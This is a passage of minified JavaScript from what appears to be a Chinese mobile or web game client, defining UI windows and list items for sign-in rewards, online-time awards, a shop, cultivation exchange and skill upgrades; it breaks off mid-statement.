__extends(e,t),e.prototype.skinComplete=function(){this.proPos={x:this.imgSoul.x,y:this.imgSoul.y},this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.updateModel(),this.updateSelectState())},e.prototype.updateModel=function(){var t,e=o.GlobalConfig.WarSoulConfig[null===(t=this.data)||void 0===t?void 0:t.cfgId];if(e){this.imgSoul.source=s.WarSoulCT.ins().getWarSoulModelImg(e.modelId),this.imgSoul.scaleX=this.imgSoul.scaleY=.3*s.WarSoulCT.ins().getWarSoulModelSet(e);var i=s.WarSoulCT.ins().getWarSoulModelPos(e);i&&(this.imgSoul.x=this.proPos.x+i.x,this.imgSoul.y=this.proPos.y+i.y)}},e.prototype.updateSelectState=function(){this.data&&(s.WarSoulCT.ins().selSwaMainInfo&&s.WarSoulCT.ins().selSwaMainInfo.id==this.data.id||s.WarSoulCT.ins().selSwaFuInfo&&s.WarSoulCT.ins().selSwaFuInfo.id==this.data.id)?this.imgSel.visible=!0:this.imgSel.visible=!1},e.prototype.setSelect=function(t){this.imgSel.visible=t},e}(n.BaseItemRender);e.WarSoulSwaItem=a,window.WarSoulSwaItem=a,__reflect(a.prototype,"WarSoulSwaItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameClubWin=void 0;var n=i(1),o=i(119),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="newGameclubSkin",e.evsIdx=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch),this.addTouchEvent(this.closeBtn,this.onClose),this.addTouchEvent(this.btnGo,this.onGoGameclub)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.evsIdx=t[0]),this.initTab(),observe(this,this.updateTabRp,o.GameclubCT.ins().postGameclubInfo),platform.getGameClubDatas(),o.GameclubCT.ins().sendSignInData(),platform.setGameClubShowOrHide(!0),this.updateTabRp(),Timer.start(2e3,-1,this.uptateGameClubData,this)},e.prototype.uptateGameClubData=function(){platform.getGameClubDatas(),o.GameclubCT.ins().sendSignInData()},e.prototype.removeDisplay=function(){this.removeObserve(),platform.setGameClubShowOrHide(!1),Timer.stopAll(this)},e.prototype.onClose=function(){platform.setGameClubShowOrHide(!1),win.close(this)},e.prototype.onGoGameclub=function(){},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()
},e.prototype.initTab=function(){this.eTab.selectedIndex=this.evsIdx,this.eVs.selectedIndex=this.evsIdx,this.eTab.validateNow()},e.prototype.onTabTouch=function(){this.evsIdx!=this.eTab.selectedIndex&&(this.evsIdx=this.eTab.selectedIndex)},e}(n.BaseView);e.GameClubWin=s,window.GameClubWin=s,__reflect(s.prototype,"GameClubWin",[]),window.GameClubWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubOCSignInItem=void 0;var n=i(3),o=i(119),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.type=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.showRed.visible=this.finish.visible=!1,this.addTouchEvent(this,this.touchSignIn)},e.prototype.dataChanged=function(){this.setData()},e.prototype.setData=function(){if(this.skin&&this.data){this.item.data=this.data.reward[0],this.days.text=this.data.day;var t=(o.GameclubCT.ins().isSignInAward>>this.data.id-1&1)<=0,e=!0;if(t){var i=this.data.tasknid;for(var n in i)o.GameclubCT.ins().returnIsGo(i[n].id,i[n].count)||(e=!1);o.GameclubCT.ins().loggedDays>=this.data.day&&e?(this.showRed.visible=!0,this.enabled=!0):(this.showRed.visible=!1,this.enabled=!1)}else this.enabled=!1,this.showRed.visible=!1,this.finish.visible=!0}},e.prototype.touchSignIn=function(){o.GameclubCT.ins().sendGameclubAward(this.type,this.data.id)},e}(n.BaseItemRender);e.GameclubOCSignInItem=s,window.GameclubOCSignInItem=s,__reflect(s.prototype,"GameclubOCSignInItem",[]),window.GameclubOCSignInItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubOCTaskItem=void 0;var n=i(3),o=i(119),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.type=2,e}return __extends(e,t),e.prototype.skinComplete=function(){this.imgGot.visible=!1,this.showRed.visible=!1,this.addTouchEvent(this.btnGet,this.touchGetTaskAward)},e.prototype.dataChanged=function(){this.setData()},e.prototype.setData=function(){if(this.skin&&this.data){this.reward.data=this.data.reward[0];var t=this.data.name;t=t.replace("%s0%",""+this.data.param),this.taskName.text=t;var e=(o.GameclubCT.ins().isTaskAward>>this.data.id-1&1)<=0,i=!0;e?(o.GameclubCT.ins().returnIsGo(this.data.type,this.data.param)||(i=!1),i?(this.btnGet.enabled=!0,this.showRed.visible=!0,this.btnGet.label=gettext("领 奖")):(this.btnGet.enabled=!1,this.showRed.visible=!1,this.btnGet.label=gettext("未完成"))):(this.btnGet.enabled=!1,this.showRed.visible=!1,this.btnGet.label=gettext("已领取"))}},e.prototype.touchGetTaskAward=function(){o.GameclubCT.ins().sendGameclubAward(this.type,this.data.id)},e}(n.BaseItemRender);e.GameclubOCTaskItem=s,window.GameclubOCTaskItem=s,__reflect(s.prototype,"GameclubOCTaskItem",[]),window.GameclubOCTaskItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameShareWin=void 0;var n=i(1),o=i(176),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WxGameShareSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){2==o.ShareCT.ins().firstGet&&this.viewStack.removeChildAt(0)},e}(n.BaseView);e.WxGameShareWin=s,window.WxGameShareWin=s,__reflect(s.prototype,"WxGameShareWin",[]),window.WxGameShareWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertMemberInfoWin=void 0;var n=i(1),o=i(248),s=i(250),a=i(44),r=i(75),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="memberInfoSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._dataVo=t[0],this.addTouchEvent(this,this.onTouch),observe(this,this.openOtherPlayerView,a.ReadPlayerCT.ins().postPlayerResult),this.update()},e.prototype.update=function(){this.imgHead.source="zjmhead_json.yuanhead"+this._dataVo.job+"1",this.labelName.text=this._dataVo.playerName,this.labelLv.text=(this._dataVo.zsLv?gettext("{0}级",this._dataVo.zsLv):"")+gettext("{0}级",this._dataVo.lv),this.btnRemove.visible=r.BurningDesertCT.ins().checkMeIsLeader(),this.btnRemove.visible?this.btnInfo.horizontalCenter=-63:this.btnInfo.horizontalCenter=0},e.prototype.onTouch=function(t){switch(t.target){case this.btnInfo:a.ReadPlayerCT.ins().sendFindPlayer(this._dataVo.roleId);break;case this.btnRemove:r.BurningDesertCT.ins().reqKickoutMember(this._dataVo.roleId),win.close(this)}},e.prototype.openOtherPlayerView=function(t){win.open(s.TeamFBCheckRoleWin,t)},e}(n.BaseView);e.BurningDesertMemberInfoWin=l,window.BurningDesertMemberInfoWin=l,__reflect(l.prototype,"BurningDesertMemberInfoWin",[]),window.MemberInfoWin=o.MemberInfoWin},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LhExpTipItem=e.LhExpTip=void 0;var n=i(3),o=i(1),s=i(0),a=i(6),r=i(121),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GainLhSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){this.eList.itemRenderer=h,this.eList.dataProvider=this.sData=new eui.ArrayCollection([]);var t=s.GlobalConfig.SamsaraItemConfig;if(t){var e=[];for(var i in t){var n={id:t[i].id,cd:t[i].cd};e.push(n)}this.sData.replaceAll(e)}},e.prototype.removeDisplay=function(){if(this.eList&&this.eList.numElements>0)for(var t=this.eList.numElements-1;t>=0;t--){var e=this.eList.getElementAt(t);e&&e.clearAll()}},e}(o.BaseView);e.LhExpTip=l,window.LhExpTip=l,__reflect(l.prototype,"LhExpTip",[]),window.LhExpTip=l;var h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t;this.addTouchEvent(this.btn,this.onClick);var e=s.GlobalConfig.ItemConfig[this.data.id];this.item.setItemImg(e.icon);var i=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,this.data.id)||0;this.item.setCount(""+i);var n=(null===(t=s.GlobalConfig.ItemDescConfig[e.descIndex])||void 0===t?void 0:t.quality)||0;this.item.setImgBg2("quality"+n),this.item.setName(e.name),this.infoTxt.text=gettext("使用后恢复时间{0}秒",this.data.cd),this.btn.enabled=this.btn.eRp.visible=i>0?!0:!1},e.prototype.onClick=function(){r.LhCT.ins().sendLhTool(this.data.id),win.close(l)},e.prototype.clearAll=function(){this.item.clearAll(),this.infoTxt.text="",this.removeTouchEvent(this.btn,this.onClick)},e}(n.BaseItemRender);e.LhExpTipItem=h,window.LhExpTipItem=h,__reflect(h.prototype,"LhExpTipItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LhLevelTipItem=e.LhLevelTip=void 0;var n=i(18),o=i(3),s=i(1),a=i(0),r=i(121),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LhPreSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){var t,e,i;this.list.itemRenderer=h,this.list.dataProvider=this.sData=new eui.ArrayCollection([]);var n=a.GlobalConfig.SamsaraLevelConfig;if(n){var o=[];for(var s in n)((null===(t=n[s])||void 0===t?void 0:t.skillDesc)||(null===(e=n[s])||void 0===e?void 0:e.equipDesc)||(null===(i=n[s])||void 0===i?void 0:i.fbDesc))&&o.push(n[s]);this.sData.replaceAll(o)}},e.prototype.removeDisplay=function(){if(this.list&&this.list.numElements>0)for(var t=this.list.numElements-1;t>=0;t--){var e=this.list.getElementAt(t);e&&e.clearAll()}},e}(s.BaseView);e.LhLevelTip=l,window.LhLevelTip=l,__reflect(l.prototype,"LhLevelTip",[]),window.LhLevelTip=l;var h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t,e,i,o,s,a,l;if(this.data){var h=r.LhCT.ins().lv>=(null===(t=this.data)||void 0===t?void 0:t.id)?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.GRAY_COLOR2,u="|C:"+h+"&T:";this.desc0.text=this.data.lvName||"";var p=0;(null===(e=this.data)||void 0===e?void 0:e.skillDesc)&&(u+=null===(i=this.data)||void 0===i?void 0:i.skillDesc,p++),(null===(o=this.data)||void 0===o?void 0:o.equipDesc)&&(0!=p&&(u+="；"),u+=null===(s=this.data)||void 0===s?void 0:s.equipDesc,p++),(null===(a=this.data)||void 0===a?void 0:a.fbDesc)&&(0!=p&&(u+="；"),u+=null===(l=this.data)||void 0===l?void 0:l.fbDesc),u+="|",this.desc.textFlow=TextFlowMakerEntry.generateTextFlow1(u)}},e.prototype.clearAll=function(){this.desc.text=""},e}(o.BaseItemRender);e.LhLevelTipItem=h,window.LhLevelTipItem=h,__reflect(h.prototype,"LhLevelTipItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OnlineTimeAwardWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(142),r=i(535),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="OnlineRewardsSkin",e.leftTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this.exitBtn,this.closeWin),this.buildList.itemRenderer=r.OnlineTimeAwardItem,this.buildList.dataProvider=this.listAc=new eui.ArrayCollection,observe(this,this.updateView,a.OtherCT.ins().updateOnlineAwardResult),observe(this,this.setTimes,a.OtherCT.ins().updateOnlineAwardResult),this.leftTime=a.OtherCT.ins().nowTime,this.updateView(),this.setTimes(),Timer.start(1e3,-1,this.setTimes,this)},e.prototype.removeDisplay=function(){this.removeObserve(),Timer.stopAll(this)},e.prototype.updateView=function(){var t=s.GlobalConfig.OnlineAwardsCfg,e=[];for(var i in t)e.push(t[i]);this.listAc.replaceAll(e),this.listAc.refresh()},e.prototype.closeWin=function(){win.close(this)},e.prototype.setTimes=function(){var t=a.OtherCT.ins().isGetAll();t&&(this.countdown.text=gettext("已完成"),Timer.stop(this.setTimes,this));var e=a.OtherCT.ins().MathValueOfTimes();0!=e||t||(this.countdown.text=gettext("可领取"),a.OtherCT.ins().isHasTime&&this.updateView()),a.OtherCT.ins().isHasTime?this.countdown.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_1):Timer.stop(this.setTimes,this)},e}(o.BaseView);e.OnlineTimeAwardWin=l,window.OnlineTimeAwardWin=l,__reflect(l.prototype,"OnlineTimeAwardWin",[]),window.OnlineTimeAwardWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OnlineTimeAwardItem=void 0;var n=i(3),o=i(11),s=i(6),a=i(142),r=i(2),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.eBtn,this.onClick),this.eList.itemRenderer=o.ItemBase},e.prototype.dataChanged=function(){if(this.redPoint.visible=!1,this.data){this.eList.dataProvider=this.listAc=new eui.ArrayCollection(this.data.rewards);var t=a.OtherCT.ins().judgeAward(this.data.id);this.time.text=gettext("{0}分",this.data.online),t?(this.eGet.visible=!1,this.eBtn.visible=!0,a.OtherCT.ins().judgeEnTime(this.data.online)?(this.eBtn.label=gettext("领 取"),this.eBtn.enabled=!0):(this.eBtn.label=gettext("未领取"),this.eBtn.enabled=!1)):(this.eGet.visible=!0,this.eBtn.visible=!1)}},e.prototype.onClick=function(){if(a.OtherCT.ins().judgeAward(this.data.id)){var t=s.BagCT.ins().rockonNeedNum(this.data.rewards);if(t&&s.BagCT.ins().getAllSurplusCount(t)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));a.OtherCT.ins().sendOnlineId(this.data.id)}},e}(n.BaseItemRender);e.OnlineTimeAwardItem=l,window.OnlineTimeAwardItem=l,__reflect(l.prototype,"OnlineTimeAwardItem",[]),window.OnlineTimeAwardItem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZzXiuWeiTip=void 0;var n=i(19),o=i(1),s=i(0),a=i(4),r=i(30),l=i(6),h=i(52),u=i(2),p=i(26),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GainZsSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.updateView,p.ZsCT.ins().postZsLv),this.addTouchEvent(this.btn0,this.onClick),this.addTouchEvent(this.btn1,this.onClick),this.addTouchEvent(this.btn2,this.onClick),this.updateView()},e.prototype.updateView=function(){var t,e,i=p.ZsCT.ins(),n=s.GlobalConfig.ZhuanShengConfig,o=s.GlobalConfig.ItemConfig[n.normalItem];this.item1.setItemImg(o.icon);var a=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,n.normalItem)||0;this.item1.setCount(""+a);var u=(null===(t=s.GlobalConfig.ItemDescConfig[o.descIndex])||void 0===t?void 0:t.quality)||0;this.item1.setImgBg2("quality"+u),this.item1.setName(o.name),o=s.GlobalConfig.ItemConfig[n.advanceItem];var d=(null===(e=s.GlobalConfig.ItemDescConfig[o.descIndex])||void 0===e?void 0:e.quality)||0;this.item2.setImgBg2("quality"+d);var c=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,n.advanceItem)||0;this.item2.setItemImg(o.icon),this.item2.setCount(""+c),this.item2.setTextColor(d),this.item2.setName(o.name),this.infoTxt1.text=gettext("增加修为:{0}",n.normalExp),this.infoTxt2.text=gettext("增加修为:{0}",n.advanceExp);var f=n.normalCount>=i.upgradeCount[1]?4587386:16720161;this.toDay1.textFlow=(new egret.HtmlTextParser).parse(gettext("<a color={0}> 今日兑换次数:{1}/{2}</a>",f,i.upgradeCount[1],n.normalCount)),f=n.advanceCount>=i.upgradeCount[2]?4587386:16720161,this.toDay2.textFlow=(new egret.HtmlTextParser).parse(gettext("<a color={0}> 今日兑换次数:{1}/{2}</a>",f,i.upgradeCount[2],n.advanceCount));var g=h.Shop.getStoreByItemID(n.normalItem);g&&(this.costCm1.setShow(r.RewardData.CURRENCY_RES[g.cost.id],g.cost.count,gettext("消耗:")),this.costCm1.setCountLabelColor(g.cost)),g=h.Shop.getStoreByItemID(n.advanceItem),g&&(this.costCm2.setShow(r.RewardData.CURRENCY_RES[g.cost.id],g.cost.count,gettext("消耗:")),this.costCm2.setCountLabelColor(g.cost)),f=n.conversionCount>=i.upgradeCount[0]?4587386:16720161,this.toDay0.textFlow=(new egret.HtmlTextParser).parse(gettext("<a color={0}> 今日兑换次数:{1}/{2}</a>",f,i.upgradeCount[0],n.conversionCount));var m=s.GlobalConfig.ZhuanShengStageConfig[i.lv];this.infoTxt0.text=gettext("增加修为:{0}\n需要经验:{1}",m.convert,m.costExp),this.item0.setItemImg("result_json.ZSexp"),this.item0.setName(gettext("经验"));var v=a>0;this.btn1.label=v?gettext("使用"):gettext("兑换"),this.costCm1.visible=!v,v=c>0,this.btn2.label=v?gettext("使用"):gettext("兑换"),this.costCm2.visible=!v,this.btn0.eRp.visible=p.ZsCT.ins().checkXWRp1(),this.btn1.eRp.visible=p.ZsCT.ins().checkXWRp2()},e.prototype.onClick=function(t){var e=s.GlobalConfig.ZhuanShengConfig,i=p.ZsCT.ins(),o=Number(t.target.name);if(1==o){var r=s.GlobalConfig.ZhuanShengStageConfig[i.lv];if(i.upgradeCount[0]>=e.conversionCount)return void u.TipsCT.ins().showTips(gettext("兑换次数不足"));if(a.ActorCC.exp<r.costExp)return void u.TipsCT.ins().showTips(gettext("兑换经验不足"));p.ZsCT.ins().sendGetXiuWei(o)}else{var d=2==o?e.normalItem:e.advanceItem,c=2==o?e.normalCount:e.advanceCount,f=2==o?i.upgradeCount[1]:i.upgradeCount[2];if(f>=c)return void u.TipsCT.ins().showTips(gettext("兑换次数不足"));if(l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,d))return void p.ZsCT.ins().sendGetXiuWei(o);var g=h.Shop.getStoreByItemID(d);if(g&&!n.GlobalFun.checkCost(g.cost.count,g.cost.id))return;p.ZsCT.ins().sendGetXiuWei(o,1)}},e}(o.BaseView);e.ZzXiuWeiTip=d,window.ZzXiuWeiTip=d,__reflect(d.prototype,"ZzXiuWeiTip",[]),window.ZzXiuWeiTip=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ComAttrBasicItem=void 0;var n=i(3),o=i(22),s=i(5),a=i(72),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;if(t.type>0){var e=a.AttributeFormat.getFormat(0,0,"+",1),i=o.AttributeData.getAttStrByType1(t,e),n=i.indexOf("</font>")>-1,r=i.split(n?"+</font>":"+");this.eName.textFlow=s.TextFlowMaker.generateTextFlow(n?r[0].concat("</font>"):r[0]),this.eVal.textFlow=s.TextFlowMaker.generateTextFlow(r[1])}else t.name&&(this.eName.textFlow=s.TextFlowMaker.generateTextFlow(t.name),this.eVal.textFlow=s.TextFlowMaker.generateTextFlow(t.valStr))},e}(n.BaseItemRender);e.ComAttrBasicItem=r,window.ComAttrBasicItem=r,__reflect(r.prototype,"ComAttrBasicItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HonorMarketItemRenderer=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=i(10),l=i(168),h=i(52),u=i(2),p=function(t){function e(){var e=t.call(this)||this;return e.goodsID=0,e._sn_="HonorMarketItemSkin",e.buyBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,e.onClick,e),e.itemIcon.addEventListener(egret.TouchEvent.TOUCH_TAP,e.showTip,e),e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;if(t){this.goodsID=t.goods[0].id;var e=a.GlobalConfig.ItemConfig[this.goodsID];if(e)if(this.isShowTips=!1,t.shopType==l.FEATS_SHOP_TYPE.Money?(this.money.text=t.costMoney.count+"",this.moneyIcon.source="ZSchip"):t.shopType==l.FEATS_SHOP_TYPE.Item&&(this.money.text=t.costItem.count+"",this.moneyIcon.source="204076_png"),this.itemName.text=e.name,this.itemName.textColor=r.ItemUtil.getQualityColor(1),this.num.text=t.goods[0].count+"",this.itemIcon&&this.itemIcon.setData&&this.itemIcon.setData(e),t.use&&(this.usage.text="（"+t.use+"）"),t.buyType==l.FEATS_TYPE.forever){this.myTimes.visible=!0;var i=h.Shop.ins().medalData.exchangeCount[t.index];i=i?i:0;var s=this.myTimes.textColor,u=void 0,p="";t.daycount&&(i>=t.daycount?(u=n.ColorUtil.RED,p=gettext("永久限购:")+("|C:"+u+"&T:"+i+"/"+t.daycount)):(u=n.ColorUtil.GREEN,p=gettext("永久限购:")+("|C:"+u+"&T:"+i+"|/|C:"+s+"&T:"+t.daycount))),this.myTimes.textFlow=o.TextFlowMaker.generateTextFlow1(p)}else if(t.buyType==l.FEATS_TYPE.infinite)this.myTimes.visible=!1;else if(t.buyType==l.FEATS_TYPE.day){this.myTimes.visible=!0;var i=h.Shop.ins().medalData.exchangeCount[t.index];i=i?i:0;var s=this.myTimes.textColor,u=void 0,p="";t.daycount&&(i>=t.daycount?(u=n.ColorUtil.RED,p=gettext("每日限购:")+("|C:"+u+"&T:"+i+"/"+t.daycount),this.isShowTips=!0):(u=n.ColorUtil.GREEN,p=gettext("每日限购:")+("|C:"+u+"&T:"+i+"|/|C:"+s+"&T:"+t.daycount))),this.myTimes.textFlow=o.TextFlowMaker.generateTextFlow1(p)}}},e.prototype.onClick=function(){return this.isShowTips?void u.TipsCT.ins().showTips("|C:16711680&T:"+gettext("今日已无兑换次数，请明日再来")):void(this.data.shopType==l.FEATS_SHOP_TYPE.Money?win.open("BuyWin",this.data.index,2):this.data.shopType==l.FEATS_SHOP_TYPE.Item&&win.open("BuyWin",this.data.index,3))},e.prototype.showTip=function(){var t,e=a.GlobalConfig.FeatsStore;for(var i in e)e[i].goods[0].id==this.goodsID&&(t=e[i].goods[0].id);void 0==t&&new Error("竟然没有找到该商品ID");var n=a.GlobalConfig.ItemConfig[t],o=this.data;win.open("ItemDetailedWin",0,n.id,o.goods[0].count)},e}(s.BaseItemRender);e.HonorMarketItemRenderer=p,window.HonorMarketItemRenderer=p,__reflect(p.prototype,"HonorMarketItemRenderer",[]),window.HonorMarketItemRenderer=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillItem=void 0;var n=i(16),o=i(5),s=i(3),a=i(0),r=i(91),l=i(80),h=i(6),u=i(10),p=i(59),d=i(86),c=i(2),f=i(63),g=i(540),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.goBtnShow=!0,e.jihuoShow=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.checkBox_auto.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.sc.addEventListener(eui.UIEvent.CHANGE_START,this.onMoveClick,this),this.sc.addEventListener(eui.UIEvent.CHANGE_END,this.onEndClick,this),this.red.visible=!1,observe(this,this.dataChanged,d.SkillCT.ins().updateSkillVule),observe(this,this.dataChanged,d.SkillCT.ins().postSkillUpgrade),this.btn_JiHuo.sRp=!0},e.prototype.dataChanged=function(){var t,e;this.skillList.itemRenderer=g.SkillItemItem,this.skillList.dataProvider=new eui.ArrayCollection([]),this.currentState=this.data.show?"show":"hide";var i=this.data.skillData;this.skillName.text=i.name||"",this.icon.source=i.icon||"",this.skillDes.textFlow=o.TextFlowMaker.generateTextFlow(i.desc||"");var s=i.lv-i.supLv;this.lv.text="Lv."+s+(i.supLv?"+"+i.supLv:""),this.skilllab0.text=gettext("技能消耗:{0}法力",(null===(t=i.config)||void 0===t?void 0:t.mp)||0),this.skilllab1.text=gettext("冷却时间:{0}s",i.cd/1e3);var r=a.GlobalConfig.SkillsConfig[i.id+s],p=this.initSkillList();this.goBtnShow=s>0&&s<p.length&&void 0!=(null===r||void 0===r?void 0:r.consume),this.gobtn.visible=this.goBtnShow;var c=s>0&&void 0==(null===r||void 0===r?void 0:r.consume);this.skilllab2.text=c?"":gettext("熟练度:{0}/{1}",i.value||0,(null===r||void 0===r?void 0:r.proficiency)||0),this.sc.height=0==this.sc.visible?0:this.sc.height,n.DisplayUtils.removeFromParent(this.sc),this.data.show&&this.group.addChild(this.sc),this.skillList.dataProvider=new eui.ArrayCollection(p),this.costGroup.visible=this.goBtnShow&&(i.value||0)>=((null===r||void 0===r?void 0:r.proficiency)||0),this.gobtn.label=this.costGroup.visible?gettext("升级"):gettext("研习"),this.icon0.source=this.icon1.source="",this.countLabel0.text=this.countLabel1.text="",this.checkBox_auto.visible=!(-1!=d.SkillCT.ins().noShowAuto.indexOf(null===(e=i.config)||void 0===e?void 0:e.desc)||!s),this.checkBox_auto.selected=i.autoUse,this.JiHuoItemId=a.GlobalConfig.SkillsDescConfig[i.descID].activation;var f=h.BagCT.ins().getBagItemById(this.JiHuoItemId);if(f&&0==i.lv?(this.jihuoShow=!0,this.btn_JiHuo.visible=!0):(this.jihuoShow=!1,this.btn_JiHuo.visible=!1),this.notImg.visible=!this.goBtnShow&&!this.jihuoShow,this.notImg.source=c?"Skill_ymj":"Skill_wjh",i.configID>=l.TotemCT.ins().TotemSkillIDMin&&i.configID<l.TotemCT.ins().TotemSkillIDMax&&(this.btn_JiHuo.visible=this.gobtn.visible=this.notImg.visible=this.red.visible=!1),this.costGroup.visible){if(null===r||void 0===r?void 0:r.consume[0]){var m=a.GlobalConfig.ItemConfig[r.consume[0].id];this.icon0.source=u.ItemUtil.getItemSource(m)||"";var v=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,r.consume[0].id)||0,y=r.consume[0].count||0,C=v>=y?"#40D016":"#B1B097";this.countLabel0.textFlow=(new egret.HtmlTextParser).parser('<font color="'+C+'"> '+v+"/"+y+"</font>")}if(null===r||void 0===r?void 0:r.consume[1]){var T=a.GlobalConfig.ItemConfig[r.consume[1].id];this.icon1.source=u.ItemUtil.getItemSource(T)||"";var b=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,r.consume[1].id)||0,w=r.consume[1].count||0,C=b>=w?"#40D016":"#B1B097";this.countLabel1.textFlow=(new egret.HtmlTextParser).parser('<font color="'+C+'"> '+b+"/"+w+"</font>")}this.updateRp()}},e.prototype.updateRp=function(){d.SkillCT.ins().lvRps[this.itemIndex].bind(this.gobtn.red)},e.prototype.onClick=function(t){switch(t.target){case this.gobtn:var e=this.data.skillData,i=e.lv-e.supLv,n=a.GlobalConfig.SkillsConfig[e.id+i];if((e.value||0)<((null===n||void 0===n?void 0:n.proficiency)||0)){if(!h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,r.ItemConst.SKILLEXP))return f.WarnCT.ins().setBuyGoodsWarn(r.ItemConst.SKILLEXP,1,!0),void p.GameFlashSaleCt.ins().reportSkillMaterialNot();d.SkillCT.ins().ViewSelectSkillIdx=this.itemIndex||0,win.open("ItemUseTipsWin",h.BagCT.ins().getBagItemById(r.ItemConst.SKILLEXP))}else{if(!n)return void c.TipsCT.ins().showTips(gettext("未激活该技能"));var o=n.consume;if(!o)return;for(var s=0;s<o.length;s++)if(h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,o[s].id)<o[s].count)return f.WarnCT.ins().setBuyGoodsWarn(o[s].id,1,!0),void p.GameFlashSaleCt.ins().reportSkillMaterialNot();d.SkillCT.ins().ViewSelectSkillIdx=this.itemIndex||0,d.SkillCT.ins().sendSkillUpgrade()}break;case this.show:this.data.show?d.SkillCT.ins().viewShowSkill(-1):d.SkillCT.ins().viewShowSkill(this.itemIndex);break;case this.btn_JiHuo:h.BagCT.ins().sendUseItem(this.JiHuoItemId,1)}},e.prototype.onMoveClick=function(){console.log("11move111"),this.parent.parent.scrollPolicyV!=eui.ScrollPolicy.OFF&&(this.parent.parent.scrollPolicyV=eui.ScrollPolicy.OFF)},e.prototype.onEndClick=function(){this.parent.parent.scrollPolicyV=eui.ScrollPolicy.ON},e.prototype.initSkillList=function(){for(var t=this.data.skillData,e=t.id+1,i=[],n=0;;){var o=a.GlobalConfig.SkillsConfig[e];if(!o){for(var s=0;s<i.length;s++)i[s].max=n;return i}i.push({cfg:o,lv:t.lv,supLv:t.supLv}),n++,e++}},e.prototype.CHANGE=function(t){var e,i,n,o,s=d.SkillCT.ins(),a=this.checkBox_auto.selected?1:0;s.isSetAutoSkill(this.itemIndex,a)?(d.SkillCT.ins().sendAutoSKill(this.itemIndex,a),(null===(i=null===(e=this.data)||void 0===e?void 0:e.skillData)||void 0===i?void 0:i.configID)>=l.TotemCT.ins().TotemSkillIDMin&&(null===(o=null===(n=this.data)||void 0===n?void 0:n.skillData)||void 0===o?void 